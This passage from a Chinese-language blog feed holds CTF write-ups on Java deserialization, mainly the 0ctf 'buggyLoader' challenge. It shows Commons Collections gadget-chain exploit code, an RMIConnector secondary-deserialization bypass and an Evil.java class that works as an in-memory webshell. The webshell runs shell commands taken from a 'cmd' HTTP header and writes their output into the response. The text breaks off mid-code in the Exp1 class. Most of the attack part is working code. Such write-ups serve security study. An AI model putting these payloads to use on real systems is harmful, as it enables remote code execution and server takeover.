class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;rO0B#X&quot;</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> exp2.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppbKWsP"><img src="https://s1.ax1x.com/2023/04/09/ppbKWsP.png" alt="ppbKWsP.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒæ¬¡ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_buggyLoader</title>
      <link href="/2022/11/03/0ctf_buggyLoader/"/>
      <url>/2022/11/03/0ctf_buggyLoader/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-buggyLoader"><a href="#0ctf-buggyLoader" class="headerlink" title="0ctf_buggyLoader"></a>0ctf_buggyLoader</h1><p>è€ƒç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.äºŒæ¬¡ååºåˆ—åŒ–</span><br><span class="line">2.ä¸å‡ºç½‘åˆ©ç”¨</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹IndexControllerï¼Œåœ¨ä¼ å‚å¤„å¹¶æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæœ€åå†æ·»åŠ ä¸€ä¸ª<code>SJTU</code>,<code>1896</code>å³å¯ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿›è¡Œè¾“å…¥æµæ—¶è°ƒç”¨çš„æ˜¯å®ƒè‡ªå®šä¹‰çš„ä¸€ä¸ªåºåˆ—åŒ–å‡½æ•°</p><p><a href="https://imgse.com/i/zQGeA0"><img src="https://s1.ax1x.com/2022/11/21/zQGeA0.png" alt="zQGeA0.png"></a></p><p>è·Ÿè¿›<code>MyObjectInputStream</code></p><p><a href="https://imgse.com/i/zQJDRU"><img src="https://s1.ax1x.com/2022/11/21/zQJDRU.png" alt="zQJDRU.png"></a></p><p>é‡å†™äº†javaåŸç”Ÿçš„<code>ObjectInputStream</code>ç±»ä¸‹çš„ååºåˆ—åŒ–å‡½æ•°</p><p>å¯¹æ¯”ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç”Ÿçš„ååºåˆ—åŒ–æ“ä½œä½¿ç”¨<code>Class.forName</code>åŠ è½½ç±»ï¼Œè€Œè¿™é‡Œæ”¹å†™æˆäº†ç”¨<code>classloader</code>å»åŠ è½½</p><p>åŒºåˆ«åœ¨å“ªå„¿ï¼Ÿ<code>Class.forName</code>å¯ä»¥åŠ è½½æ•°ç»„ç±»ï¼Œè€Œ<code>classloader</code>ä¸èƒ½è¿›è¡Œæ•°ç»„ç±»çš„åŠ è½½</p><p>é¢˜ç›®ç¯å¢ƒæ˜¯æœ‰cc3.2.1ä¾èµ–çš„ï¼Œcc3.2.1ä¸­å¸¸è§„é“¾éƒ½åˆ©ç”¨åˆ°<code>InvokerTransformer</code>æ•°ç»„ï¼Œåœ¨<a href="https://gh0st.vip/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">shiro550</a>ä¸­é€šè¿‡æ‹¼æ¥<code>CC3,CC2,CC6</code>æ„é€ å‡ºäº†ä¸€æ¡æ— éœ€<code>InvokerTransformer</code>æ•°ç»„çš„åˆ©ç”¨é“¾ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        TemplatesImpl templatesimpl=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c=templatesimpl.getClass();</span><br><span class="line">        Field _nameField=c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templatesimpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field _byteCodesField=c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes= &#123;code&#125;;</span><br><span class="line">        _byteCodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC6</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templatesimpl);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">        lazyMap.remove(templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        serialize(hashMap2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†å®é™…ä¸ŠExpé‡Œé¢<code>byte[][] codes= &#123;code&#125;</code>ä¸ºå­—èŠ‚æ•°ç»„ï¼Œåœ¨æœ¬é¢˜ç¯å¢ƒä¸‹ä¹Ÿæ˜¯æ— æ³•åˆ©ç”¨çš„</p><p>è¿™é‡Œå°±æœ‰ä¸¤æ¡æ€è·¯ï¼Œæ‰¾åˆ°å¦ä¸€æ¡ä¸éœ€è¦ç”¨åˆ°æ•°ç»„ç±»çš„åˆ©ç”¨é“¾ï¼Œæˆ–è€…æƒ³åŠæ³•åœ¨ä½¿ç”¨æ•°ç»„ç±»çš„æƒ…å†µä¸‹ç»•è¿‡é™åˆ¶</p><p>å®é™…æƒ…å†µæ˜¯æƒ³è¦å†æ‰¾åˆ°ä¸€æ¡ä¸åˆ©ç”¨æ•°ç»„ç±»çš„é“¾å­å‡ ä¹æ˜¯ä¸å¯èƒ½çš„äº†ï¼Œæ‰€ä»¥åªæœ‰æƒ³åŠæ³•å®ç°ç¬¬äºŒç§æƒ…å†µ</p><h2 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h2><p>é€šè¿‡ä¸€ä¸ªååºåˆ—åŒ–çš„æµæ¥æ–°å»ºä¸€ä¸ªååºåˆ—åŒ–ï¼ŒæŠŠä¸€ä¸ªå—é™çš„ååºåˆ—åŒ–ç»™å˜æˆä¸€ä¸ªä¸å—é™çš„ååºåˆ—åŒ–ï¼Œåœ¨javaä¸­ï¼Œå¯ä»¥é€šè¿‡äºŒæ¬¡ååºåˆ—åŒ–æ¥ç»•è¿‡è¯¸å¤šé™åˆ¶</p><p>å…·ä½“åˆ†æè¯·å‚è€ƒä»¥å‰å†™çš„åšæ–‡</p><p>æœ¬é¢˜çš„çªç ´ç‚¹åœ¨äºæ‰¾åˆ°ä¸€ä¸ªæ— å‚çš„ï¼Œ<code>public</code>çš„ï¼Œç»§æ‰¿<code>serialize</code>æ¥å£(å› ä¸ºä½œä¸ºå…¥å£ç±»ï¼Œæ‰€ä»¥éœ€è¦ç»§æ‰¿åºåˆ—åŒ–æ¥å£)çš„ç±»æ¥ä»£æ›¿<code>newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>æ¨èä¸€ä¸ªå·¥å…·<a href="https://codeql.github.com/">CodeQl</a>ï¼Œå…·ä½“çš„ç”¨æ³•è¿™é‡Œå°±ä¸è¯¦ç»†è®²è§£äº†ï¼Œå¸ˆå‚…ä»¬å¯å‚é˜…å®˜æ–¹æ–‡æ¡£è¿›è¡Œå­¦ä¹ </p><p>æ¥ä¸‹æ¥å°±æ˜¯æ¼«æ¼«å¯»æ‰¾å¯ç”¨ç±»çš„è¿‡ç¨‹äº†</p><p>æœ€ç»ˆæ˜¯æ‰¾åˆ°<code>RMIConnector</code>ç±»è¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–æ“ä½œ</p><p><code>RMIConnector</code>ä¸‹çš„<code>findRMIServerJRMP()</code>æ–¹æ³•</p><p><a href="https://imgse.com/i/zQq5hd"><img src="https://s1.ax1x.com/2022/11/21/zQq5hd.png" alt="zQq5hd.png"></a></p><p>å¾€ä¸Šæ‰¾ï¼Œéœ€è¦<code>/stub</code></p><p><a href="https://imgse.com/i/zQqLB8"><img src="https://s1.ax1x.com/2022/11/21/zQqLB8.png" alt="zQqLB8.png"></a></p><p>ç»§ç»­å¾€ä¸Šï¼Œåœ¨è¯¥ç±»<code>connect()</code>æ–¹æ³•ä¸­å‘ç°è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tracing) logger.trace(<span class="string">&quot;connect&quot;</span>,idstr + <span class="string">&quot; finding stub...&quot;</span>);</span><br><span class="line"><span class="type">RMIServer</span> <span class="variable">stub</span> <span class="operator">=</span> (rmiServer!=<span class="literal">null</span>)?rmiServer:</span><br><span class="line">findRMIServer(jmxServiceURL, usemap);</span><br></pre></td></tr></table></figure><p>è¯¥ç±»çš„æ„é€ å‡½æ•°å®Œç¾ç¬¦åˆè¦æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RMIConnector</span><span class="params">(JMXServiceURL url, Map&lt;String,?&gt; environment)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="literal">null</span>, url, environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h2 id="ä¸å‡ºç½‘åˆ©ç”¨"><a href="#ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨"></a>ä¸å‡ºç½‘åˆ©ç”¨</h2><p>ç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥éœ€æ„é€ ç‰¹æ®Šæ¶æ„ç±»æˆ–å†™å†…å­˜é©¬</p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšä¾¿æ‰¾ä¸€æ¡ccé“¾è£…è¿›å»ï¼Œè¿™é‡Œé‡‡ç”¨cc3æ‹¼æ¥cc6ï¼Œå› ä¸ºcc3ä¸­éœ€è¦ç”¨åˆ°<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ï¼Œè€Œè¯¥ç±»åœ¨é«˜ç‰ˆæœ¬jdkä¸­æ˜¯æ²¡æœ‰çš„</p><h2 id="Expæ„é€ "><a href="#Expæ„é€ " class="headerlink" title="Expæ„é€ "></a>Expæ„é€ </h2><p><strong>Exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title 